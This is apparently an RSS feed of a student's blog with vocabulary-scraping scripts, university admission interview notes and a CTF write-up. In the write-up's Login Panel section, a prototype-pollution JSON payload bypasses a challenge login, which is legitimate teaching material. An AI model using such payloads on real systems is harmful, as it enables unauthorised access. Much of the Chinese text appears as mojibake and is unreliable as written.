<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:version="2.0"><channel><title>Blog</title><description>Âó®</description><link>https://yih-0118.github.io/</link><language>tw</language><item><title>Â∏∏Êò•Ëó§ÈõúË™åÁöÑÂñÆÂ≠ó</title><link>https://yih-0118.github.io/blog/%E7%88%AC%E5%B8%B8%E6%98%A5%E8%97%A4%E9%9B%9C%E8%AA%8C%E7%9A%84%E5%96%AE%E5%AD%97/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/%E7%88%AC%E5%B8%B8%E6%98%A5%E8%97%A4%E9%9B%9C%E8%AA%8C%E7%9A%84%E5%96%AE%E5%AD%97/</guid><description>ÊòéÂÄ´ÂñÆÂ≠óÂç°Âè™Â∑ÆÂ∏∏Êò•Ëó§ÁöÑÂñÆÂ≠ó</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/%E7%88%AC%E5%B8%B8%E6%98%A5%E8%97%A4%E9%9B%9C%E8%AA%8C%E7%9A%84%E5%96%AE%E5%AD%97/&quot;&gt;https://yih-0118.github.io/blog/%E7%88%AC%E5%B8%B8%E6%98%A5%E8%97%A4%E9%9B%9C%E8%AA%8C%E7%9A%84%E5%96%AE%E5%AD%97/&lt;/a&gt;&lt;/blockquote&gt; &lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import requests
from bs4 import BeautifulSoup
import re
import csv
from json import dumps

urls = [
    &amp;quot;https://www.ivy.com.tw/newsLetter/analysis_cont/2024050715515268612&amp;quot;,
]

def reclaimed(text):
    corrections = {
        &amp;#39;.vt.&amp;#39;: &amp;#39;vt.&amp;#39;,
        &amp;#39;.vi.&amp;#39;: &amp;#39;vi.&amp;#39;,
        &amp;#39;.n.&amp;#39;: &amp;#39;n.&amp;#39;,
        &amp;#39;.a.&amp;#39;: &amp;#39;a.&amp;#39;,
        &amp;#39;.adv.&amp;#39;: &amp;#39;adv.&amp;#39;,
        &amp;#39;.prep.&amp;#39;: &amp;#39;prep.&amp;#39;,
        &amp;#39;.conj.&amp;#39;: &amp;#39;conj.&amp;#39;,
        &amp;#39;.interj.&amp;#39;: &amp;#39;interj.&amp;#39;,
        &amp;#39;.v.&amp;#39;: &amp;#39;v.&amp;#39;,
        &amp;#39;.adj.&amp;#39;: &amp;#39;adj.&amp;#39;
    }

    
    for incorrect, correct in corrections.items():
        text = text.replace(incorrect, correct)
    parts = text.split(&amp;#39;&amp;amp;&amp;#39;)
    results = []
    for part in parts:
        part = part.strip()
        pos_pattern = r&amp;#39;^(vt\.|vi\.|n\.|a\.|adv\.|prep\.|conj\.|interj\.|v\.|adj\.)&amp;#39;
        pos_match = re.match(pos_pattern, part)
        if pos_match:
            pos = pos_match.group(1)  
            chinese = part[len(pos):].strip()  
            results.append({&amp;#39;pos&amp;#39;: pos, &amp;#39;chinese&amp;#39;: chinese})
        else:
            results.append({&amp;#39;pos&amp;#39;: &amp;#39;&amp;#39;, &amp;#39;chinese&amp;#39;: part.strip()})
    return results


for url in urls:
    response = requests.get(url)
    html_content = response.text
    soup = BeautifulSoup(html_content, &amp;#39;html.parser&amp;#39;)
    pubDate = soup.find_all(&amp;quot;span&amp;quot;, style=re.compile(&amp;quot;font-size:2.4em&amp;quot;))
    if len(pubDate) &amp;gt;= 2:
        day = pubDate[1].text.strip().zfill(2)
        month = pubDate[0].text.strip().zfill(2)
        file_pubDate = f&amp;quot;{month}-{day}&amp;quot;
    else:
        file_pubDate = &amp;quot;unknown&amp;quot;

    title = soup.find(&amp;quot;h1&amp;quot;, class_=&amp;quot;title&amp;quot;)
    if title:
        file_name = title.text.strip().replace(&amp;quot; &amp;quot;, &amp;quot;_&amp;quot;)
        file_name = re.sub(r&amp;#39;[&amp;lt;&amp;gt;:&amp;quot;/\\|?*]&amp;#39;, &amp;#39;_&amp;#39;, file_name)
    else:
        file_name = &amp;quot;output&amp;quot;

    csv_file_name = f&amp;quot;{file_pubDate}_{file_name}.csv&amp;quot;
    json_file_name = f&amp;quot;{file_pubDate}_{file_name}.json&amp;quot;

    words = []
    phrases = []

    words_block = soup.find(&amp;quot;div&amp;quot;, id=&amp;quot;words_block&amp;quot;)
    if words_block:
        for word_block in words_block.find_all(&amp;quot;div&amp;quot;, class_=&amp;quot;my-voca-word&amp;quot;):
            word = word_block.contents[0].strip()
            chinese_block = word_block.find_next(&amp;quot;div&amp;quot;, class_=&amp;quot;my-voca-mean-con&amp;quot;).text.strip()
            meanings = reclaimed(chinese_block)
            for meaning in meanings:
                words.append({
                    &amp;quot;word&amp;quot;: word,
                    &amp;quot;pos&amp;quot;: meaning[&amp;#39;pos&amp;#39;],
                    &amp;quot;chinese&amp;quot;: meaning[&amp;#39;chinese&amp;#39;]
                })

    phrases_block = soup.find(&amp;quot;div&amp;quot;, id=&amp;quot;phrases_block&amp;quot;)
    if phrases_block:
        for phrase in phrases_block.find_all(&amp;quot;div&amp;quot;, class_=&amp;quot;my-voca-word&amp;quot;):
            phrase = phrase.contents[0].strip()
            chinese = phrase.find(&amp;quot;div&amp;quot;).text.strip()
            phrases.append({&amp;quot;phrase&amp;quot;: phrase, &amp;quot;pos&amp;quot;: &amp;quot;phr.&amp;quot;, &amp;quot;chinese&amp;quot;: chinese})

    with open(csv_file_name, mode=&amp;#39;w&amp;#39;, encoding=&amp;#39;utf-8&amp;#39;, newline=&amp;#39;&amp;#39;) as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow([&amp;quot;word/phrase&amp;quot;, &amp;quot;pos&amp;quot;, &amp;quot;chinese&amp;quot;])
        for word in words:
            csv_writer.writerow([word[&amp;#39;word&amp;#39;], word[&amp;#39;pos&amp;#39;], word[&amp;#39;chinese&amp;#39;]])
        for phrase in phrases:
            csv_writer.writerow([phrase[&amp;#39;phrase&amp;#39;], phrase[&amp;#39;pos&amp;#39;], phrase[&amp;#39;chinese&amp;#39;]])

    result = {&amp;quot;vocabularies&amp;quot;: []}
    with open(csv_file_name, &amp;quot;r&amp;quot;, encoding=&amp;quot;utf-8&amp;quot;) as csvfile:
        reader = csv.reader(csvfile)
        next(reader)
        for row in reader:
            dictionary = {
                &amp;quot;vocabulary&amp;quot;: row[0],
                &amp;quot;partOfSpeech&amp;quot;: row[1],
                &amp;quot;chinese&amp;quot;: row[2]
            }
            result[&amp;quot;vocabularies&amp;quot;].append(dictionary)

    with open(json_file_name, &amp;#39;w&amp;#39;, encoding=&amp;quot;utf-8&amp;quot;) as file:
        file.write(dumps(result, ensure_ascii=False))

    print(f&amp;quot;ÊàêÂäüÂÑ≤Â≠ò{csv_file_name} Âíå {json_file_name}&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Fri, 03 Jan 2025 10:25:27 GMT</pubDate></item><item><title>AllplusÁöÑÂñÆÂ≠ó</title><link>https://yih-0118.github.io/blog/%E7%88%ACallplus/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/%E7%88%ACallplus/</guid><description>Áµ¶È´ò‰∫åÂèóÁõäÁöÑ</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/%E7%88%ACallplus/&quot;&gt;https://yih-0118.github.io/blog/%E7%88%ACallplus/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;Â¶Ç‰ΩïÂéªÁà¨ÂèñAll plusÈõúË™åÁöÑÂñÆÂ≠óÂ∞éÂá∫json&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import requests
from bs4 import BeautifulSoup
from json import dumps
import re

def after_name(raw_name):
    name = re.sub(r&amp;#39;[\\/:*?&amp;quot;&amp;lt;&amp;gt;|]&amp;#39;, &amp;#39;_&amp;#39;, raw_name.replace(&amp;#39;\n&amp;#39;, &amp;#39;&amp;#39;).strip())
    name = re.sub(r&amp;#39;\s+&amp;#39;, &amp;#39; &amp;#39;, name)  
    return name

def crawler(page):
    response = requests.get(page)
    response.encoding = &amp;#39;utf-8&amp;#39;
    soup = BeautifulSoup(response.text, &amp;#39;html.parser&amp;#39;)
    vocabulary_list = []
    sections = soup.find_all(&amp;#39;div&amp;#39;, class_=&amp;#39;main-word&amp;#39;)
    for section in sections:
        vocabulary = section.find(&amp;#39;div&amp;#39;, class_=&amp;#39;word&amp;#39;).text.strip()
        pos = section.find(&amp;#39;div&amp;#39;, class_=&amp;#39;explain&amp;#39;).find(&amp;#39;span&amp;#39;, class_=&amp;#39;part-of-speech-tag&amp;#39;).text.strip()
        chinese = section.find(&amp;#39;div&amp;#39;, class_=&amp;#39;explain&amp;#39;).text.strip().split(&amp;#39; &amp;#39;)[-1]
        vocabulary_list.append({
            &amp;quot;vocabulary&amp;quot;: vocabulary,
            &amp;quot;partOfSpeech&amp;quot;: pos,
            &amp;quot;chinese&amp;quot;: chinese
        })
    file_name = soup.find(&amp;#39;span&amp;#39;, class_=&amp;#39;small&amp;#39;)
    file_name = after_name(file_name.text)
    return vocabulary_list, file_name

if __name__ == &amp;quot;__main__&amp;quot;:
    base = &amp;quot;https://voccard.liveabc.com/allplus/2024/9/&amp;quot; #Ëá™Ë°åË™øÊï¥Êúà‰ªΩËàáÂπ¥‰ªΩ
    day = [f&amp;quot;{base}{day}&amp;quot; for day in range(1, 20)]  
    for page in day:
        vocabulary, output = crawler(page) 
        result = {&amp;quot;vocabularies&amp;quot;: vocabulary}
        output = f&amp;quot;{output}.json&amp;quot;
        with open(output, &amp;#39;w&amp;#39;, encoding=&amp;quot;utf-8&amp;quot;) as json_file:
            json_file.write(dumps(result, ensure_ascii=False, indent=4))
        print(f&amp;quot;Vocabulary data saved to &amp;#39;{output}&amp;#39;.&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Fri, 03 Jan 2025 01:15:57 GMT</pubDate></item><item><title>114ÈôΩÊòé‰∫§ÈÄöÂ§ßÂ≠∏ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶</title><link>https://yih-0118.github.io/blog/114%E9%99%BD%E6%98%8E%E4%BA%A4%E9%80%9A%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/114%E9%99%BD%E6%98%8E%E4%BA%A4%E9%80%9A%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</guid><description>‰∫§Â§ßÂú®ËÅñË™ïÁØÄÈù¢Ë©¶üíÄ</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/114%E9%99%BD%E6%98%8E%E4%BA%A4%E9%80%9A%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&quot;&gt;https://yih-0118.github.io/blog/114%E9%99%BD%E6%98%8E%E4%BA%A4%E9%80%9A%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&lt;/a&gt;&lt;/blockquote&gt; &lt;h3&gt;114‰∫§Â§ßË≥áÂ∑•Á≥ª(Ë≥áÂÆâÁµÑ) ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶ ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;‰∫§Â§ßÁØ©‰∫∫Ê®ôÊ∫ñ‰∏çÁü•ÈÅìÊòØ‰ªÄÈ∫º
ÁúüÁöÑÂèàÊòØÁØ©ÁØ©ÁØ©&lt;/p&gt;
&lt;h3&gt;Áï∂Â§©ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;p&gt;ËÅΩË™™ÂéªÂπ¥ÊòØÊ≤íÊúâ‰ºëÊÅØÂÆ§Ôºå‰ªäÂπ¥ÊúâÔºå&lt;del&gt;Â§ßÂÆ∂ÈÉΩÊòØÁÜüÈù¢Â≠îÁé©Â§™Âó®Ë¢´Âà∂Ê≠¢&lt;/del&gt;
ÊúâÁ¥ôÊú¨Ë≥áÊñôÂèØ‰ª•Â∏∂ÈÄ≤Âéª&lt;/p&gt;
&lt;h3&gt;Èù¢Ë©¶ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;h4&gt;Èù¢Ë©¶ÊïôÂÆ§‰ΩàÂ±Ä&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Bym1leqdkl.png&quot; alt=&quot;‰∫§Â§ß&quot;&gt;&lt;/p&gt;
&lt;h6&gt;Èù¢Ë©¶ÂïèÈ°å&lt;/h6&gt;
&lt;p&gt;Ëá™Êàë‰ªãÁ¥π‰∏ÄÂàÜÈêò
Ë´ã‰ªãÁ¥πËá™Â∑±ÁöÑ‰∫ÆÈªûËÆìÊàëÂÄëÈåÑÂèñ‰Ω†&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;APCS 43‰πüÂ§™‰Ωé&lt;ul&gt;
&lt;li&gt;Êàë: Âæå‰æÜËÄÉÂà∞54&lt;/li&gt;
&lt;li&gt;ÊïôÊéà: ‰πüÊ≤íÂ§öÈ´ò&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Âú∞ÁêÜÂ•ßÊûóÂåπ‰∫ûÔºÅË´ãÂàÜ‰∫´‰∏Ä‰∏ã‰Ω†ÁöÑÂ•ßÊûóÂåπ‰∫û&lt;/li&gt;
&lt;li&gt;Ëß£Èáã‰∏Ä‰∏ãCNN&lt;/li&gt;
&lt;li&gt;AIS3Â∞àÈ°åÂÅö‰∫Ü‰ªÄÈ∫º&lt;/li&gt;
&lt;li&gt;AIS3 JUNIORÂÅöÁöÑÂ∞àÈ°å&lt;/li&gt;
&lt;li&gt;prompt injection‰ªãÁ¥π‰ª•ÂèäÈÉ®ÁΩ≤ÁöÑÊ≠∑Á®ã&lt;/li&gt;
&lt;li&gt;ÈóúÊñº‰∫§Â§ßË≥áÂÆâÁ§æÂúòbamboofox‰Ω†ÂèÉËàá‰∫Ü‰ªÄÈ∫ºÔºü&lt;/li&gt;
&lt;li&gt;ÊìÖÈï∑Âì™ÂÄãÈ†òÂüü&lt;/li&gt;
&lt;li&gt;Âú®Ê†°ÊÄéÈ∫ºÁ∂≠ÊåÅÁöÑ&lt;/li&gt;
&lt;li&gt;YTPÈÄ≤Ê±∫Ë≥ΩÁÇ∫‰ªÄÈ∫º‰∏çÂéªÊØî&lt;/li&gt;
&lt;li&gt;Êµ∑Â§ßË∑ü‰∫§Â§ß‰Ω†ÊúÉÈÅ∏Êìá‰∫§Â§ßÔºåÁÇ∫‰ªÄÈ∫ºÔºü &lt;/li&gt;
&lt;li&gt;cggc‰Ω†ÁöÑË≤¢Áçª‰ª•ÂèäÊúÄÊúâÂøÉÂæóÁöÑÈ°åÁõÆ&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;Ë¢´ÂóÜÁàõ&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Wed, 25 Dec 2024 14:35:48 GMT</pubDate></item><item><title>2024 THJCC WINTER writeup</title><link>https://yih-0118.github.io/blog/2024-thjcc-winter-writeup/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/2024-thjcc-winter-writeup/</guid><description>Ë¢´ÂóÜÁàÜ‰∫Ü‰∏ãÊ¨°ÊîπÈÄ≤</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/2024-thjcc-winter-writeup/&quot;&gt;https://yih-0118.github.io/blog/2024-thjcc-winter-writeup/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;ÂâçË®Ä&lt;/h2&gt;
&lt;p&gt;ÊàëÈÄôÊ¨°Âá∫ÂÖ©È°åÔºåÂàÜÂà•ÊòØ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web&lt;ul&gt;
&lt;li&gt;Login Panel&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Misc&lt;ul&gt;
&lt;li&gt;png chunk&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2&gt;Login Panel&lt;/h2&gt;
&lt;p&gt;È†êÊúüËß£ÊòØ prototype pollution&lt;/p&gt;
&lt;h3&gt;sql injection&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;SELECT ? AS SECRET FROM users WHERE user = ? AND password = ?
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;-&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;SELECT ? AS SECRET FROM users WHERE user = &amp;#39;admin&amp;#39; AND password = &amp;#39;1&amp;#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;but ÈÄôÊ®£Ë°å‰∏çÈÄö&lt;/p&gt;
&lt;h3&gt;prototype pollution&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;loginData = Object.assign({ secret }, loginData); // oh, that&amp;#39;s cool
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÖ∂‰∏≠ÈÄôÈÇäÊúâÂÄã prototype pollution
Object.assign Â∞á secret Âä†ÂÖ• loginDataÔºåÂèØËÉΩÂ∞éËá¥Â∞çË±°ÂéüÂûãÁöÑÊ±°Êüì„ÄÇ
ÂéüÂÖàÁöÑloginDataÊòØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
  &amp;quot;secret&amp;quot;: &amp;quot;THJCC{fake}&amp;quot;,
  &amp;quot;user&amp;quot;: &amp;quot;admin&amp;quot;,
  &amp;quot;password&amp;quot;: &amp;quot;1&amp;quot;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•Âä†ÂÖ•&lt;code&gt;__proto__&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Âè™Ë¶ÅÊàë&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
  &amp;quot;user&amp;quot;: &amp;quot;admin&amp;quot;,
  &amp;quot;__proto__&amp;quot;: {
    &amp;quot;password&amp;quot;: {
      &amp;quot;password&amp;quot;: 1
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âä†ÂÖ• &lt;code&gt;__proto__&lt;/code&gt; ÁöÑÔºåÊï¥ÂÄã &lt;code&gt;Object.prototype.password.password&lt;/code&gt; Ë¢´Ë®≠ÁÇ∫ 1&lt;/p&gt;
&lt;p&gt;ÈÇ£&lt;img src=&quot;https://hackmd.io/_uploads/rkAO9L6Vye.png&quot; alt=&quot;Êà™Âúñ 2024-12-16 15.44.42&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG : THJCC{pRoTo7YP3_Poi50ninG???}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;png chunk&lt;/h2&gt;
&lt;p&gt;È°ßÂêçÊÄùÁæ©Â∞±ÊòØpng ÁöÑÂçÄÂ°ä
Áî®
&lt;a href=&quot;https://www.nayuki.io/page/png-file-chunk-inspector&quot;&gt;https://www.nayuki.io/page/png-file-chunk-inspector&lt;/a&gt;
ÂéªÁúãÊúÉÁôºÁèæ
&lt;img src=&quot;https://hackmd.io/_uploads/HkXLiUTV1e.png&quot; alt=&quot;image&quot;&gt;
IEND Âíå ITAT ÁöÑ‰ΩçÁΩÆÊúâÈåØ
Âè™ÊúâÊääÂÆÉË™øÊï¥ÈÅé‰æÜÂ∞±Â•Ω
&lt;img src=&quot;https://hackmd.io/_uploads/SkM9i8aN1x.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/S1doo8aEyl.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Login Panel ÈùûÈ†êÊúüËß£&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S1PznI6Nye.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HJrQ286Nkl.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Â¶ÇÊûúÊÇ®ÊòØÈÄöÈùàÂ§ßÂ∏´ÔºåÈÇ£È∫ºÂØÜÁ¢ºËóèÂú®È¶ñÈ†Å&lt;/em&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/ByjmR86N1g.png&quot; alt=&quot;image&quot;&gt;
&lt;del&gt;ÂØÜÁ¢ºÂ∞±ÊòØnever gonna give you up&lt;/del&gt;
{&amp;quot;user&amp;quot;:&amp;quot;admin&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;&lt;a href=&quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;ab_channel=RickAstley%22%7D&quot;&gt;https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;amp;ab_channel=RickAstley&amp;quot;}&lt;/a&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/ry6uR8aEke.png&quot; alt=&quot;image&quot;&gt;
ü§è&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Mon, 16 Dec 2024 15:52:19 GMT</pubDate></item><item><title>114Ê∏ÖËèØÂ§ßÂ≠∏ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶</title><link>https://yih-0118.github.io/blog/114%E6%B8%85%E8%8F%AF%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/114%E6%B8%85%E8%8F%AF%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</guid><description>Êñ∞Á´πÈ¢®Â•ΩÂ§ß</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/114%E6%B8%85%E8%8F%AF%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&quot;&gt;https://yih-0118.github.io/blog/114%E6%B8%85%E8%8F%AF%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&lt;/a&gt;&lt;/blockquote&gt; &lt;h3&gt;114Ê∏ÖÂ§ßË≥áÂ∑•Á≥ª(Ë≥áÂÆâÁµÑ) ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶ ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;Ê∏ÖÂ§ßÁØ©‰∫∫Ê®ôÊ∫ñ‰∏çÁü•ÈÅìÊòØ‰ªÄÈ∫º
ÁúãËµ∑‰æÜÂ§ßÈÉ®ÂàÜÈÉΩÊúâÈÄ≤Èù¢Ë©¶ÁöÑÊ®£Â≠ê&lt;/p&gt;
&lt;h3&gt;Áï∂Â§©ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;p&gt;ÊàëÊòØÁ¨¨‰∏ÄÂÄãÈù¢Ë©¶ÁöÑ
ÂÖ∂‰ªñÊúÉÊúâÊúÉÊúâ‰ºëÊÅØÂÆ§&lt;/p&gt;
&lt;h3&gt;Èù¢Ë©¶ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;h4&gt;Èù¢Ë©¶ÊïôÂÆ§‰ΩàÂ±Ä&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkK2CJ9_ke.png&quot; alt=&quot;Ê∏ÖÂ§ß&quot;&gt;&lt;/p&gt;
&lt;h6&gt;Èù¢Ë©¶ÂïèÈ°å&lt;/h6&gt;
&lt;ol&gt;
&lt;li&gt;Ëá™Êàë‰ªãÁ¥π3~5ÂàÜÈêò&lt;/li&gt;
&lt;li&gt;ÊìÖÈï∑Âì™ÂÄãÊñπÈù¢&lt;/li&gt;
&lt;li&gt;appÊòØÂππÂòõÁî®ÁöÑ&lt;/li&gt;
&lt;li&gt;Ë≥áÂÆâÂá∫ÈÅéÊúÄÊúâÁâπËâ≤ÁöÑÈ°åÁõÆÊòØ‰ªÄÈ∫º&lt;/li&gt;
&lt;li&gt;ÂÄã‰∫∫Ë≥ΩÊúâÈÅé‰ªÄÈ∫ºÊØîË≥Ω&lt;/li&gt;
&lt;li&gt;ÈáëÁõæÊÄéÈ∫ºÊ≤íÈÄ≤&lt;/li&gt;
&lt;li&gt;ÊÉ≥Ë¶ÅÁπºÁ∫åÊâìÁ´∂Á®ãÂóéÔºü&lt;/li&gt;
&lt;li&gt;‰Ω†Êú™‰æÜÊúâË¶ÅÁπºÁ∫åÊâìÔºÜÂ≠∏ÁøíË≥áÂÆâÂóéÔºü&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;Á¨¨‰∏ÄÂÄãÈù¢Ë©¶ÔºåÈõ£ÂÖçÊúÉÁ∑äÂºµ&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sun, 08 Dec 2024 14:23:50 GMT</pubDate></item><item><title>114Êµ∑Ê¥ãÂ§ßÂ≠∏ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶</title><link>https://yih-0118.github.io/blog/114%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/114%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/</guid><description>1206Èù¢Ë©¶dayÁöÑÊúÄÂæå‰∏ÄÁ´ô</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/114%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&quot;&gt;https://yih-0118.github.io/blog/114%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%B8%E7%89%B9%E6%AE%8A%E9%81%B8%E6%89%8D%E9%9D%A2%E8%A9%A6/&lt;/a&gt;&lt;/blockquote&gt; &lt;h3&gt;114Êµ∑Ê¥ãË≥áÂ∑•Á≥ª(Ë≥áÂÆâÁµÑ&amp;amp;‰∏ÄËà¨ÁµÑ) ÁâπÊÆäÈÅ∏ÊâçÈù¢Ë©¶ ÂøÉÂæó&lt;/h3&gt;
&lt;p&gt;Êµ∑Â§ßÁØ©‰∫∫Ê®ôÊ∫ñ‰∏çÁü•ÈÅìÊòØ‰ªÄÈ∫º
ÂèçÊ≠£Â∞±ÊòØÁØ©ÁØ©ÁØ©&lt;/p&gt;
&lt;h3&gt;Áï∂Â§©ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;p&gt;Âú®ÂÖ≠Ê®ìÂ†±Âà∞ÔºåÂ¶ÇÊûúÂâçÈù¢Ê≤íÊúâ‰∫∫‰æÜÔºå‰Ω†ÊúÉÂÖàË¢´Âè´ÂéªÈù¢Ë©¶üíÄ
Á∞°Á´†Ë™™‰∏çËÉΩË™øÊôÇÈñìÔºå‰ΩÜ‰πüÂè™ÊòØË™™Ë™™ËÄåÂ∑≤ÔºåÊàëË¢´Ë™øÂà∞Âà∞Êï∏Á¨¨‰∫åÂÄãÈù¢Ë©¶
&lt;del&gt;Êó©‰∏äÈù¢Ë©¶‰∏≠ËààÂæàË∂ï&lt;/del&gt;
(ÂÅáÂ¶Ç11:00Èù¢Ë©¶ÂÆå‰∏≠ËààÔºå14:30Êµ∑Ê¥ãÂ§ßÂ≠∏ÁµïÂ∞ç‰æÜÂæóÂèäÔºå‰ΩÜÊòØË¶ÅÂæûÂçóÊ∏ØÂùêË®àÁ®ãËªäÂéª)&lt;/p&gt;
&lt;h3&gt;Èù¢Ë©¶ÊÉÖÊ≥Å&lt;/h3&gt;
&lt;h4&gt;Èù¢Ë©¶ÊïôÂÆ§‰ΩàÂ±Ä&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJg5wUx4kg.png&quot; alt=&quot;Êµ∑Â§ß&quot;&gt;&lt;/p&gt;
&lt;h6&gt;Èù¢Ë©¶ÂïèÈ°å&lt;/h6&gt;
&lt;ol&gt;
&lt;li&gt;Ëá™Êàë‰ªãÁ¥π1ÂàÜÈêò&lt;/li&gt;
&lt;li&gt;Âî∏Ëã±ÊñáÊñáÁ´†&lt;/li&gt;
